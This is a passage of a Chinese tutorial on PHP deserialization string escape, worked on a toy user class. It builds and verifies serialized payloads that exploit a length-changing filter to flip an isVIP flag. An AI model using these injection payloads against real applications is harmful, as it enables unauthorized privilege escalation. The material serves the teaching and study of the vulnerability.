class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$isVIP</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$u</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;isVIP = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">user</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;123456&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a_seri</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br><span class=\"line\"><span class=\"comment\">//可以看到，由于isVIP在构造函数中被赋值为0，因此序列化后的&quot;isVIP&quot;;i:0</span></span><br></pre></td></tr></table></figure>\n<p>这个时候我们增加一个函数，用于对<strong> admin</strong> 字符进行替换，将<strong> admin</strong> 替换为<strong> hacker</strong>，替换函数如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function filter($s)&#123;</span><br><span class=\"line\">    return str_replace(&quot;admin&quot;,&quot;hacker&quot;,$s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这一段程序的输出为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>那么我们的 admin 就会被替换为 hacker</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; //已过滤</span><br></pre></td></tr></table></figure>\n<p>仔细看，虽然 admin 变为了 hacker，但长度并没有从 5 变成 6，<strong>因此我们可以使用对象逃逸将 isVIP 变为 1</strong></p>\n<p>在字符变多的对象逃逸中，我们需要构造我们需要的 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;    //length=47</span><br></pre></td></tr></table></figure>\n<p>因为我们需要逃逸的字符串长度为<strong> 47</strong>，并且<strong> admin</strong> 每次过滤之后都会变成<strong> hacker</strong>，也就是说每出现一次<strong> admin</strong>，就会多<strong> 1</strong> 个字符。</p>\n<p>因此我们需要重复 47 遍 admin，这样他过滤 47 遍，我们的目标 payload 就可以完全覆盖了</p>\n<p>因此我们在可控变量处，重复<strong> 47</strong> 遍<strong> admin</strong>，然后加上我们逃逸后的目标子串，可控变量修改如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>\n<p>然后我们利用代码做拼接形成完整的 payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$isVIP</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$u</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;isVIP = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;hacker&quot;</span>,<span class=\"variable\">$s</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">user</span>(<span class=\"string\">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class=\"string\">&#x27;123456&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\">//上面的第一个&#x27;&#x27;中是我们构造的目标串，第二个&#x27;&#x27;中是马上要被覆盖的串</span></span><br><span class=\"line\"><span class=\"variable\">$a_seri</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter</span> = <span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$a_seri</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a_seri_filter</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>由于<strong>反序列化后，多余的子串会被抛弃</strong>， <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </code> 我们可以直接无视</p>\n<p>尝试反序列化验证我们的 isVIP 是否变为了 1</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter</span> = <span class=\"string\">&#x27;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter_unseri</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a_seri_filter</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"variable\">$a_seri_filter_unseri</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//result：</span></span><br><span class=\"line\"><span class=\"keyword\">object</span>(user)<span class=\"comment\">#1 (3) &#123;</span></span><br><span class=\"line\">  [<span class=\"string\">&quot;username&quot;</span>]=&gt;</span><br><span class=\"line\">  <span class=\"keyword\">string</span>(<span class=\"number\">282</span>) <span class=\"string\">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class=\"line\">  [<span class=\"string\">&quot;password&quot;</span>]=&gt;</span><br><span class=\"line\">  <span class=\"keyword\">string</span>(<span class=\"number\">6</span>) <span class=\"string\">&quot;123456&quot;</span></span><br><span class=\"line\">  [<span class=\"string\">&quot;isVIP&quot;</span>]=&gt;</span><br><span class=\"line\">  <span class=\"keyword\">int</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>那么，灵魂拷问，上面的 username 和 password 都是可控参数，那么我能能不能控制 password 字段？</p>\n<p>在这个例子中是不可以的，因为我们不能对用户的密码做替换，但是如果这个字段不是 password，是 nickname 这样的会被过滤的，那么我们的 payload 也可以写在 nickname 中</p>\n<p>最后，我们总结一下，想要通过过滤后字符串变多来实现对象逃逸，我们需要哪些步骤</p>\n<blockquote>\n<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>\n<p>​\t上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>\n<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>\n<p>​\t上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>\n<p>3. 分析它的过滤函数，得到每次过滤我们可以逃逸出的字符数量，与我们的 (2) 中 payload 相比，凑够（2）中字符的数量</p>\n<p>​\t上述例子中，我们从 admin 变为 hacker，每次过滤字符多一个，因此我们要逃逸 47 个字符，我们就需要重复 47 遍 admin</p>\n<p>4. 将我们构造的 payload 放到程序中，得到完整的 payload：</p>\n<p>​\t上述例子中，我们构造的 payload 是：</p>\n<p><code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code></p>\n<p>通过程序：</p>\n<p><code>$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;','123456');</code></p>\n<p>生成我们最终的 payload：</p>\n<p><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code></p>\n<p>5.unserialize 进行验证</p>\n</blockquote>\n<h5 id=\"过滤后字符变少\"><a class=\"markdownIt-Anchor\" href=\"#过滤后字符变少\">#</a> 过滤后字符变少</h5>\n<p>同样的过滤，这次将 admin 变为 hack</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$isVIP</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$u</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;isVIP = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;hack&quot;</span>,<span class=\"variable\">$s</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">user</span>(<span class=\"string\">&#x27;admin&#x27;</span>,<span class=\"string\">&#x27;123456&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter</span> = <span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$a_seri</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a_seri_filter</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">result:</span><br><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;user&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;username&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;hack&quot;</span>;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;password&quot;</span>;s:<span class=\"number\">6</span>:<span class=\"string\">&quot;123456&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;isVIP&quot;</span>;i:<span class=\"number\">0</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>同样，我们想把 isVIP 变为 1，比较一下<strong>现有子串</strong>和<strong>目标子串</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;\t//现有子串</span><br><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;\t//目标子串</span><br></pre></td></tr></table></figure>\n<p>因为过滤的时候，将<strong> 5</strong> 个字符删减为了<strong> 4</strong> 个，所以和上面字符变多的情况相反，随着加入的<strong> admin</strong> 的数量增多，<strong>现有子串</strong>后面会缩进来。</p>\n<p>计算一下<strong>目标子串</strong>的长度：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;\t//目标子串</span><br><span class=\"line\">//长度为47</span><br></pre></td></tr></table></figure>\n<p>再计算一下到<strong>下一个可控变量</strong>的字符串长度：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;</span><br><span class=\"line\">//长度为22</span><br></pre></td></tr></table></figure>\n<p>因为每次过滤的时候都会少<strong> 1</strong> 个字符，因此我们先将<strong> admin</strong> 字符重复<strong> 22</strong> 遍，这里 22 遍是大概值，后续还需要调整</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;123456&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $a_seri_filter;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>** 注意：**PHP 反序列化的机制是，比如如果前面是规定了有 10 个字符，但是只读到了 9 个就到了双引号，这个时候 PHP 会把双引号当做第 10 个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p>\n<p>105 个字符结束后，位置如下</p>\n<p><code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:</code></p>\n<p>也就是我们覆盖了 <code>;s:8:&quot;password&quot;;s:6:</code> ，接下来我们的 username 的值变会覆盖后续的字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $a_seri_filter;</span><br><span class=\"line\"></span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>仔细观察这一串字符串可以我们希望覆盖的 107 个字符，但是前面只有显示 105</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>解决办法是</strong>：多添加<strong> 2</strong> 个<strong> admin</strong>，这样就可以补上缺少的字符。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $a_seri_filter;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>115 个字符的覆盖范围 <code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</code></p>\n<p>可以看到，这一下就对了。</p>\n<p>我们将对象反序列化然后输出，代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class user&#123;</span><br><span class=\"line\">\tpublic $username;</span><br><span class=\"line\">\tpublic $password;</span><br><span class=\"line\">\tpublic $isVIP;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic function __construct($u,$p)&#123;</span><br><span class=\"line\">\t\t$this-&gt;username = $u;</span><br><span class=\"line\">\t\t$this-&gt;password = $p;</span><br><span class=\"line\">\t\t$this-&gt;isVIP = 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function filter($s)&#123;</span><br><span class=\"line\">\treturn str_replace(&quot;admin&quot;,&quot;hack&quot;,$s);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\">$a_seri_filter_unseri = unserialize($a_seri_filter);</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump($a_seri_filter_unseri);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>得到结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">object(user)#2 (3) &#123;</span><br><span class=\"line\">  [&quot;username&quot;]=&gt;</span><br><span class=\"line\">  string(115) &quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;</span><br><span class=\"line\">  [&quot;password&quot;]=&gt;</span><br><span class=\"line\">  string(6) &quot;123456&quot;</span><br><span class=\"line\">  [&quot;isVIP&quot;]=&gt;</span><br><span class=\"line\">  int(1)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总结一下变短的步骤：</p>\n<blockquote>\n<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>\n<p>​\t上述例子中 username，password 